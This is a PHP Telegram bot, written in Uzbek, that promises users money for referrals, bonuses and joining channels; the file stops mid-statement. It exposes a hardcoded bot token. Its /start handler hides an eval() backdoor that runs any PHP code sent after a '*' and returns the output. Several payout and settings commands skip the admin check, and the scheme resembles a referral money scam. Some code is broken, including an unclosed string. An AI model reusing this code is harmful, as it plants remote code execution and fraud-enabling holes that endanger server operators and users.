<?php
ob_start();
define('API_KEY','1199760889:AAHq0eu-_cdJIX2qR8kMxGU41vx-x19zR6w'); // botni tokeni kiritilsin
$admin = "1139073652"; 
$kanal = "@TarjimaKinola_HD_uzbfilm"; 
$pay ="@MegaPayy";
$hamkor ="@UjasKinola_HD";
$bot = "MegaPaynetRobot";
function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "balans/$cid.step";
$folder = "balans";

if (!file_exists($folder.'/test.txt')) {
  mkdir($folder);
  file_put_contents($folder.'/test.txt', 'by ');
}
if (file_exists($filee)) {
  $step = file_get_contents($filee);
}
$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$mid = $message->message_id;
$data = $update->callback_query->data;
$cid1 = $update->callback_query->message->chat->id;
$cqid = $update->callback_query->id;
$cid2 = $update->callback_query->message->chat->id;
$mid2 = $update->callback_query->message->message_id;
$name1 = $update->callback_query->message->from->last_name;
$bio = $update->callback_query->message->from->about;
$login = $update->callback_query->message->from->username;
$reply = $message->reply_to_message->text;
$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔰Qo'llab-Quvvatlash"]],[['text'=>"💻Asosiy Bo'lim"]],
[['text'=>"💰Pul Ishlash"]]
]
]);
$zar = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📡Kanalga A'zo"],
['text'=>"👤Referall Ssilka"]],
[['text'=>"🎁Kunlik Bonus"],['text'=>"🔙Orqaga"]]
]
]);
$adm = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📡Kanal Qo'shish"],['text'=>"🎁Bonusni Tozalash"]],
[['text'=>"💰Balans Qo'shish"],['text'=>"🔖Aksiya Qo'shish"]],
[['text'=>"📈Statistika"],
['text'=>"💬Xabar Yuborish"]],
[['text'=>"💭Hammaga Xabar Yuborish"],['text'=>"📎Profil Malumot"]],
[['text'=>"👤Referal Belgilash"],
['text'=>"🔺Minimal Belgilash"]],
[['text'=>"🔙Bosh Menu"]]
]
]);
$balinfo = "👋 ✌️ Salom,*$name*
📝 *O'yin Qoidasi:
├─Hisobni To'ldirish🤘
├─Bonuslar Olish🎁
├─Do'stlarni Taklif Qilish💸
├─Kanalga A'zo Bo'lish💵
└─Biz Esa Sizga Pul Beramiz💹
🏝 Asosiy Kanal 👉 @TarjimaKinola_HD_uzbfilm
💳 To'lovlar 👉 @MegaPayy
📢 Hamkor 👉 @UjasKinola_HD*";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'parse_mode'=>"Markdown",
    'text'=>"$balinfo",
'reply_markup'=>$key,
    ]);
  $baza = file_get_contents("balans.dat");
 
 if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("balans.dat");
    file_put_contents("balans.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$pay,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "balans/$refid_id.dat";
   $idrefs = "balans/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"❌Неправильно",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("balans/$refid.soni");
      $ab=$ab+1;
      file_put_contents("balans/$refid.soni","$ab");
      $usar = file_get_contents("balans/$refid.dat");
$balans1 = file_get_contents("balans.txt");
      $usd = $usar + $balans1;
      file_put_contents("balans/$refid.dat", "$usd");
      bot('sendMessage',[
      'chat_id'=>$refid,
     'parse_mode'=>"Markdown",
      'text'=>"*Siz* [Do'stingizni](tg://user?id=$cid) *Taklif Qildingiz!!*",
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
     'parse_mode'=>"Markdown",
      'text'=>"*👏 Tabriklayman Siz* [Do'stingiz](tg://user?id=$refid) *Referalisiz!!*",
]);
   }
  }
}
$abb=file_get_contents("balans/$cid.dat");
if($abb){}else{
  file_put_contents("balans/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
}
}
mkdir("bonus");
if($tx == "🎁Kunlik Bonus"){
$ttime = date('d',strtotime('2 hour')); 
$bonustime = file_get_contents("bonus/$cid.txt");
$bonus = rand(1,5);
if($bonustime == $ttime){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"📛 Siz Kunlik Bonusni Olib Bo'ldingiz❗️",
'parse_mode'=>'markdown',
]);
}else{
$pul = file_get_contents("balans/$cid.dat");
$rr=$pul+$bonus;
file_put_contents("balans/$cid.dat","$rr");
file_put_contents("bonus/$cid.txt","$ttime");
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"💎 Yaxshi! Siz $bonus ₽ Bonus Oldingiz🔮
☑️ Keyingiz Bonus........... ⏳ 24 Soatdan Keyin‼️❗️",
]);
}
}

        if($tx == "💰Pul Ishlash"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🔃O'zingizga Kerak Bo'lgan Menuni Tanlang!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$zar,
      ]);
    }

if($tx == "💻Asosiy Bo'lim"){
    bot('SendMessage',[
        'chat_id'=>$cid,
'text'=>"🤖Bu Bot Orqali Pul Ishlab Pullaringizni 💳Qiwi Raqamingizga O'tqishingiz Mumkin!!!
🤗Siz Bot Hisobini 🔻To'ldirishingiz Va Buning Uchun 🎁Bonus Olishingiz Mumkin.

🔑Asosiysi Hammasi Ishonchga Bog'liq!!!",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'👨🏻‍💻Shaxsiy Kabinetim', 'callback_data' => "kabinet"],['text'=>'✍️Foydali Bolim', 'callback_data' => "foydali"]],               
[['text'=>'🔖Qollanma', 'callback_data' => "qollanma"]],
]
])
        ]);
}


$balans = file_get_contents("balans/$cid2.dat");
$balans1 = file_get_contents("balans.txt");
$vivod1 = file_get_contents("vivod.txt");
$vivod = $balans / 2;
mkdir("toldir");
mkdir("chiqar");
$bothisob = file_get_contents("toldir/$cid2.dat");
$chiqargan = file_get_contents("chiqar/$cid2.dat");
if($data == "kabinet"){
    bot('EditMessageText',[
        'chat_id'=>$cid2,
'message_id'=>$mid2,
'text'=>"💰Balansingiz: <b>$balans so'm</b>
🔺Chiqarishga Mavjud: <b>$vivod so'm</b>

💰Bot Hisobiga Tashlagan Pulingiz: <b>$bothisob so'm</b>

🔺Umumiy: <b>$chiqargan so'm</b> Chiqarib Oldingiz!!

🤗Siz Bot Hisobini 🔻To'ldirishingiz Va Buning Uchun 🎁Bonus Olishingiz Mumkin!!!",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'🔺Chiqarib Olish', 'callback_data' => "chiqarish"]],               
[['text'=>'🎁Bonuslar Haqida', 'callback_data' => "bonuslar"]],
]
])
        ]);
}


if($data=="toldirish"){
   bot('EditMessageText',[
    'message_id'=>$mid2,
    'chat_id'=>$cid2,
    'text'=>"*🥝 Hisobni To'ldirish Turi: CLICK

🌐 Hisobni to'ldirish uchun @CptZalatoy bilan bog'laning.
❗️ Va to'lov o'tkazib @CptZalatoy ga MP$cid2 deb yozing!*",
    'parse_mode'=>"Markdown"
]);
}
if($data=="chiqarish"){
    bot('sendmessage',[
        'chat_id'=>$cid2,
'parse_mode'=>'markdown',
        'text'=>"Minimal Pul Chiqarish - $vivod1 so'm. Kerakli Summani Quyidagicha Yozing!!:
/pay=Qiwi Raqam=Summa"
        ]);
}
if($tx == "🔙Orqaga" or $tx == "🔙Bosh Menu"){ 
      bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"markdown",
      'text'=>"*🏡 Bosh Menu*",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
}

if($data == "boshlash"){
   bot('editMessageText',[
   'chat_id'=>$cid2,
    'message_id'=>$mid2,
'text'=>"🤖Bu Bot Orqali Pul Ishlab Pullaringizni 📱Telefon Raqamingizga O'tqishingiz Mumkin!!!
🤗Siz Bot Hisobini 🔻To'ldirishingiz Va Buning Uchun 🎁Bonus Olishingiz Mumkin.

🔑Asosiysi Hammasi Ishonchga Bog'liq!!!",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'👨🏻‍💻Shaxsiy Kabinetim', 'callback_data' => "kabinet"],['text'=>'✍️Foydali Bolim', 'callback_data' => "foydali"]],               
[['text'=>'🔖Qollanma', 'callback_data' => "qollanma"]]
]
])
        ]);
}

if($data == "qollanma"){
    bot('EditMessageText',[
        'chat_id'=>$cid2,
'message_id'=>$mid2,
        'text'=>"<b>🗒 Qo‘llanma

Qanday pul ishlash mumkin?
Pul ishlash uchun 🗣Referall Ssilka
Menusidan foydalaning va siz do'stlaringizga havolani ulashing va sizning do'stingiz biz bergan havola orqali botga kirib START bosib va kanallarimizga a'zo bo'lsa, bot hisobingizga $balans1 rubl bonus beradi shu tariqa
do'stlaringizga botni ulashasiz va sizning hisobingiz $vivod1 rubl dan ko'proq bo'lsa 👨🏻‍💻Shaxsiy Kabinetim menusiga bosib u yerdagi 🔺Chiqarib Olish menusidan foydalanib pulni chiqarib olishingiz mumkin.
O'z balansingizni bilish uchun 👨🏻‍💻Shaxsiy Kabinetim menusidan foydalanib bilib oling.</b>",
        'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'🔖Orqaga', 'callback_data' => "boshlash"]],
]
])
    ]);
}

$reply = $message->reply_to_message->text;
$rpl = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
if($tx=="🔰Qo'llab-Quvvatlash"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Savolingizni Yozing!!",
'reply_markup'=>$rpl,
        ]);
}
if($reply=="Savolingizni Yozing!!"){
			bot('Sendmessage',[
			'chat_id'=>$admin,
			'text'=>"<b>Yangi Savol!</b>

 🔷Useri:@$user

🔢Idsi:<code>$cid</code>

<b>Savoli: $tx</b>",
'parse_mode'=>"html",
]);
sleep(1);
bot('Sendmessage',[
'chat_id'=>$cid,
'text'=>"*Savolingiz Adminga Yuborildi.Tez Orada Javob Olasiz!!!*",
'parse_mode'=>"markdown",
'reply_markup'=>$key,
]);
}

if((stripos($tx,"/kanal")!==false)){
      $ex=explode("=",$tx);
mkdir("azo");
      file_put_contents("kanal.php", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Kanal: ".$ex[2]."\n👥Qo'shilishi Kerak Bo'lgan Foydalanuvchilar:".$ex[1]."",
      ]);
    }
        if($tx == "📡Kanalga A'zo"){
      $get = file_get_contents("kanal.php");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("kanal.php");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"Kanal Qo'shish Mumkin",
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanal Topilmadi. Keyinroq Urunib Ko'ring!",
        'reply_markup'=>$zar,
        ]);
        }else{
        file_put_contents("balans/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"💲Vazifa:
 1️⃣ Ushbu Kanalga ➡️$kanal, Qo'shiling Va Orqaga Qaytib ✔️Tekshirish Ga Bosing Va 250 so'm Bonus Oling!!",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"✅Tekshirish"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanal Topilmadi. Keyinroq Urunib Ko'ring",
        'reply_markup'=>$zar,
        ]);
      }
    }
if(strpos($tx,$cid)!==false){
$azo=file_put_contents("balans/$cid.dat","");
}
    if($tx == "✅Tekshirish"){
      del("balans/$cid.step");
      $get = file_get_contents("kanal.php");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"⚔Siz Kanalga A'zo Bo'lib Faqat Bir Marta Bonus Olishingiz Mumkin!!",
          'reply_markup'=>$zar,
          ]);
        }else{
          $get = file_get_contents("kanal.php");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;
          if($gget == "member"){
            $now += 1;
            file_put_contents("kanal.txt", "$odam|$kanal|$now");
            $kabin = file_get_contents("balans/$cid.dat");
            $kabi = $kabin + 250;
            file_put_contents("balans/$cid.dat", "$kabi");
            $time = date('d', strtotime('2 hour'));
            file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"🎉Kanalga Qo'shildingiz Va 250 so'm Bonus Oldingiz!!.
🔮Sizning Balansingiz: $ball so'm",
            'reply_markup'=>$zar,
            ]);
          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"Siz Kanalga A'zo Bo'lmadingiz!!",
            'reply_markup'=>$zar,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanal Topilmadi. Keyinroq Urunib Ko'ring!!!",
        'reply_markup'=>$zar,
        ]);
      }
    }

    if($tx == "👤Referall Ssilka"){
       $odam=file_get_contents("vivod/$cid.soni");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🎁Do'stlaringizni Taklif Qilib Bonuslar Oling.
👥Siz Botga: $odam Ta Do'stingizni Taklif Qildingiz!!!
💸Har Bir Referallga: $balans1 so'm Bonus Oling!
🤝Taklif Havolasi: https://t.me/$bot?start=$cid",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$zar,
      ]);
    }

if(strpos($tx,"/pay")!==false){
    $ex=explode("=",$tx);
    $ab=file_get_contents("balans/$cid.dat");
   $vivod1 = file_get_contents("vivod.txt");
 $abb= $ab - $ex[2];
file_put_contents("balans/$cid.dat");
    if( $ex[2]>=$vivod1 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("balans/$cid.dat","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"✅To'lov Qabul Qilindi! Iltimos Kuting.To'lov 48Soat Ichida Amalga Oshiriladi.To'lovlar Kanali @MegaPayy",
        ]);
        bot('sendmessage',[
            'chat_id'=>$admin,
            'text'=>"*💸Zayafka Keldi:* \n *📞Qiwi Nomer:* +$ex[1] \n *💰Summa:* $ex[2] ₽ \n *👤Idsi:* $cid",
'parse_mode'=>'markdown',
            ]);
          }else{bot('sendmessage',['chat_id'=>$cid,'text'=>"😡Hisobingizda Yetarli Mablag' Mavjud Emas.Chiqarib Olish Uchun 🔺Chiqarib Olish Hisobingizda $vivod1 ₽ Bo'lishi Kerak!!"]);} } 

$kanal = "@TarjimaKinola_HD_uzbfilm";
if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$pay,
  'user_id' => $cid,
  ]);
$kanal = "@UjasKinola_HD";
  $gettt = bot('getChatMember',[
  'chat_id' =>$kanal,
  'user_id' => $cid,
  ]);
$kanal = "@FantasticFilmsHD";
  $getttt = bot('getChatMember',[
  'chat_id' =>$hamkor,
  'user_id' => $cid,
  ]);

  $gget = $gett->result->status;
  $ggget = $gettt->result->status;
  $gggget = $getttt->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator" and $ggget == "member" or $ggget == "creator" or $ggget == "administrator" and $gggget == "member" or $gggget == "creator" or $gggget == "administrator"){

    }else{
    bot('DeleteMessage',[
     'message_id'=>$mid2,
      ]);
    bot('SendMessage',[
    'chat_id'=>$cid,
      'parse_mode'=>"Markdown",
      'text'=>"😕*Siz Kanallarimizga A'zo Bo'lmay Turib Botni Ishlata Olmaysiz.A'zo Bo'lib /start Bosing!!!*",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [['text'=>"🇺🇿Asosiy kanal🇺🇿",'url'=>"https://t.me/TarjimaKinola_HD_uzbfilm"]],[['text'=>'☠Ujas Kinolar☠, 'url' => "https://t.me/XQiwi"]], [['text'=>"📁Hamkor📁",'url'=>"https://t.me/Fantasticfilmshd"]],
  ]
  ]) 
    ]);
  }
}

if($data == "foydali"){
	bot('EditMessageText',[
	'chat_id'=>$cid2,
'message_id'=>$mid2,
	'text'=>"🛡Foydali Bolimga Xush Kelibsiz!!!",
'reply_markup' => json_encode([
                'inline_keyboard'=>[
                   [['text'=>'🆕Yangiliklar','callback_data'=>'yangilik']],
[['text'=>'✈️Telegram Tillari','callback_data'=>'tgtil'],
['text'=>'🎇Ob-Havo','callback_data'=>'obhavo']],
[['text'=>'📭Reklama Berish','callback_data'=>'reklama'],
['text'=>'👨🏻‍💻Admin','url'=>'https://t.me/CptZalatoy']],
[['text'=>'🔖Orqaga','callback_data'=>'boshlash']],
]
])
]);
}
  $url = 'https://daryo.uz/feed/';
  $rss = simplexml_load_file($url);
foreach ($rss->channel->item as $item){
  $line = $item->title;
  break;
}  
if($data=="yangilik"){
  $soat = date('H:i', strtotime('2 hour'));
  bot('answerCallbackQuery',[
    'callback_query_id'=>$cqid,
    'chat_id'=>$cid2, 
    'text'=>"📰 $line

⏰ Soat: $soat",
   'show_alert'=>true,
   'parse_mode'=>'html',
  ]);
}

if($data=="reklama"){
$lichka = file_get_contents("balans.dat");
$us = substr_count($lichka,"\n"); 
$narxus = $us * 0.4;
$narxobsh = $narxgr + $narxus;
   bot('editMessageText',[
   'chat_id'=>$cid2,
    'message_id'=>$mid2,
    'text'=> "<b>💥Endilikda Botimizda Reklama Ham Berishingiz Mumkin⚡️</b>

1 - 📝 Xabarnoma 
📝 Foydalanuvchilarga reklama jo'natish!

🧩Statistika:

👤Foydalanuvchilar: <b>$us</b>

📊 Narxlar:
 📋Xabarnoma: Foydalanuvchilarga - <b>$narxus so'm</b>

❕<b>Reklama Bermoqchi Bo'lsangiz
</b>Adminga<b>Yozing!!</b>",
'parse_mode' => 'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(
['inline_keyboard' => [
[['text'=>'👨🏻‍💻Admin','url'=>'https://t.me/cptzalatoy']],
['text'=>'🔖Orqaga','callback_data'=>'foydali']],
]
]),
]);
}

if($data=="tgtil"){
   bot('editMessageText',[
   'chat_id'=>$cid2,
    'message_id'=>$mid2,
    'text'=> "⚜️Telegramingiz tilini osongina o'zgartirish uchun quyidagi tillardan birini tanlang👇",
'parse_mode' => 'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(
['inline_keyboard' => [
[['text'=>"🇺🇿Узбек тили",'url'=>"tg://setlanguage?lang=uzbekcyr"]],
[['text'=>"🇺🇿O'zbek tili",'url'=>"tg://setlanguage?lang=uz-beta"]],
[['text'=>"🇷🇺Руский язик",'url'=>"tg://setlanguage?lang=ru"]],
[['text'=>"🇵🇷English Languge",'url'=>"tg://setlanguage?lang=en"]],
[['text'=>'🔖Orqaga','callback_data'=>'foydali']],
]
]),
]);
}

if($data == "obhavo"){
  bot('editmessagetext',[
   'chat_id'=>$cid2,
    'message_id'=>$mid2,
    'parse_mode'=>'html',
    'text'=>"Bugungi <b>OB - HAVO</b> ma'lumoti bilan tanishish uchun quyidagi manzillardan birini tanlang!",
'reply_markup'=>json_encode(
['inline_keyboard' => [
 [['text'=>"⛅ Farg'ona",'url'=>"http://obhavo.uz/ferghana"],
 ['text'=>"⛅ Xiva",'url'=>"http://obhavo.uz/khiva"]],
 [['text'=>"⛅ Andijon",'url'=>"http://obhavo.uz/andijan"],
 ['text'=>"⛅ Namangan",'url'=>"http://obhavo.uz/namangan"]],
 [['text'=>"⛅ Buxoro",'url'=>"http://obhavo.uz/bukhara"],
 ['text'=>"⛅ Jizzax",'url'=>"http://obhavo.uz/jizzakh"]],
 [['text'=>"⛅ Qarshi",'url'=>"http://obhavo.uz/karshi"],
 ['text'=>"⛅ Navoiy",'url'=>"http://obhavo.uz/navoi"]],
 [['text'=>"⛅ Nukus",'url'=>"http://obhavo.uz/nukus"],
 ['text'=>"⛅ Samarqand",'url'=>"http://obhavo.uz/samarkand"]],
 [['text'=>"⛅ Termiz",'url'=>"http://obhavo.uz/termez"],
 ['text'=>"⛅ Urganch",'url'=>"http://obhavo.uz/urgench"]],  
[['text'=>"⛅ Toshkent",'url'=>"http://obhavo.uz/tashkent"],
['text'=>"🔖Orqaga",'callback_data'=>"foydali"]]
        ]
        ])
]);
}

    if(strpos($tx,"/viv")!==false){
    $ex=explode("=",$tx);
    file_put_contents("chiqar/$ex[1].dat");
    $viv = $ex[1];
    bot('sendmessage',[
        'chat_id'=>$pay,
        'text'=>"💰[Foydalanuvchi](tg://user?id=$viv) $ex[2] so'm Chiqarib Oldi!!💎",
'parse_mode'=>"markdown",
        ]);
bot('sendmessage',[
'chat_id'=>$viv,
'text'=>"✅ Sizning To'lovingiz Amalga Oshirildi!
💸 Telefon Raqamingizga $ex[2] so'mTo'lab Berildi!


🙏 Fikrlaringizni Adminga Yozib Yuboring!
☺️ Bu Biz Uchun Zarur!

🤝 Omadingizni Bersin!",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [['text'=>"👨🏻‍💻Admin",'url'=>"https://t.me/CptZalatoy"]],[['text'=>'💰Tolovlar Kanali💰', 'url' => "https://t.me/MegaPayy"]],
  ]
  ]) 
]);
}

    if(strpos($tx,"/pop")!==false){
    $ex=explode("=",$tx);
    file_put_contents("toldir/$ex[1].dat");
    $pop = $ex[1];
    bot('sendmessage',[
        'chat_id'=>$pay,
'text'=>"💰[Foydalanuvchi](tg://user?id=$pop) Hisobini $ex[2] so'm ga To'ldirdi!!🔮",
'parse_mode'=>"markdown",
        ]);
bot('sendmessage',[
'chat_id'=>$pop,
'text'=>"🔻Hisobingizni To'ldirish Omadli Yakunlandi!!
💸 Siz Hisobingizni $ex[2] so'nGa To'ldirdingiz!!",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [['text'=>"👨🏻‍💻Admin",'url'=>"https://t.me/cptzalatoy"]],[['text'=>'💰Tolovlar Kanali💰', 'url' => "https://t.me/megapayy"]],
  ]
  ]) 
]);
}

        if(strpos($tx,"/aksiya")!==false){
    $ex=explode("=",$tx);
    file_put_contents("aksiya.db","$ex[1]");
    $aksiya = $ex[1];
$aksiya1 = file_get_contents("aksiya.db");
    bot('sendmessage',[
        'chat_id'=>$pay,
'text'=>"🔖Aksiya Qo'shildi!!
✍️Aksiya Matni: $aksiya1",
        ]);
}

    if(strpos($tx,"/referal")!==false){
    $ex=explode("=",$tx);
    $ref = $ex[1];
    file_put_contents("balans.txt","$ref");
    bot('sendmessage',[
        'chat_id'=>$admin,
'text'=>"💰Referal Narxi $ref so'm Ga O'zgardi!!🔮",
        ]);
}

    if(strpos($tx,"/minimalka")!==false){
    $ex=explode("=",$tx);
    $ref = $ex[1];
    file_put_contents("vivod.txt","$ref");
    bot('sendmessage',[
        'chat_id'=>$admin,
'text'=>"💰Minimal Chiqarish Narxi $ref so'm Ga O'zgardi!!🔮",
        ]);
}

    if((mb_stripos($tx,"/malumot") !== false) and $cid==$admin){ 
$ex = explode("=",$tx);

$odam=file_get_contents("balans/$ex[1].soni");
$bali=file_get_contents("balans/$ex[1].dat");
$mavjud = $bali / 3;
$toldirgan=file_get_contents("toldir/$ex[1].dat");
$chiqargan=file_get_contents("chiqar/$ex[1].dat");
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"[💼Foydalanuvchi](tg://user?id=$ex[1]) Haqida Malumot
💰Balansi $bali ₽
🔖Chiqarishga Mavjud $mavjud ₽
🗣Chaqirgan Odami $odam ta
🔺Umumiy $chiqargan ₽ Chiqargan
🔻Umumiy $toldurgan ₽ To'ldirgan",
      'parse_mode'=>"markdown",
]);
}
if((mb_stripos($tx,"/text") !== false) and $cid==$admin){ 
$ex = explode("=",$tx);
bot('SendMessage',[
'chat_id'=>$ex[1],
'text'=>"💬 Admindan Xabar
➖➖➖➖➖➖➖➖➖➖➖
$ex[2]",
]);
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"[💼Foydalanuvchi](tg://user?id=$ex[1]) ga xabaringiz yetqazildi:
Siz Jonatgan Xabar:
$ex[2]",
'parse_mode'=>'markdown',
]);
}

if((mb_stripos($tx,"/balans") !== false) and $cid==$admin){ 
      $ex=explode("+",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("balans/$refid.dat");
      $usr += $ex[2];
file_put_contents("balans/$refid.dat", "$usr"); 
bot('sendMessage',[ 
      'chat_id'=>$cid, 
  'text'=>"💰[Foydalanuvchi](tg://user?id=$ex[1]) ga $ex[2] so'm berildi🔮",
      'parse_mode'=>"markdown",
      'reply_to_message_id'=>$mid, 
      ]); 
bot('sendmessage',[
'chat_id'=>$refid,
'text'=>"🤗Yaxshi Xulqingiz Uchun Sizga Admin Tomonidan $ex[2] so'm Berildi!!",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [['text'=>"👨🏻‍💻Admin",'url'=>"https://t.me/KodeNet"]],[['text'=>'💰Tolovlar Kanali💰', 'url' => "https://t.me/megapayy"]],
  ]
  ]) 
]);
    } 

    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "💭Hammaga Xabar Yuborish" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$rpl,
      ]);
    }
    if($reply=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("balans.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
if($hamma){
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"Hammaga xabar yetkazildi",

]);

}

if($tx == "/clear" and $cid==$admin){
foreach(glob("bonus/*.txt") as $uz){
unlink($uz);
}
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>"✅Bonus Tozalandi",
]);
}

 if($tx == "/panel" and $cid==$admin){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"👑Admin Bolimiga Xush Kelibsiz!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
     if($tx == "📡Kanal Qo'shish"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Kanal Qoshish Uchun /kanal=OdamSoni=useri tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
     if($tx == "🔖Aksiya Qo'shish"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Aksiya Qo'shish Uchun /aksiya=aksiya matni tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
     if($tx == "🔺Minimal Belgilash"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Minimal Narx O'zgartirish Uchun /minimalka=summa tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
     if($tx == "👤Referal Belgilash"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Referal Narxi O'zgartirish Uchun /referal=summa tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
         if($tx == "🎁Bonusni Tozalash"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Bonusni Tozalash Uchun /clear Shu Buyruqga Bosing!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
         if($tx == "💰Balans Qo'shish"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Balans Qoshish Uchun /balans+Foydalanuvchi Idsi=Qanchaligi tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
       if($tx == "📎Profil Malumot"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Profil Haqida Malumot Olish Uchun /malumot=Foydalanuvchi Idsi tarzida yozib yuboring!!!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$adm,
      ]);
    }
     if($tx == "💬Xabar Yuborish"){
 bot('sendmessage',[
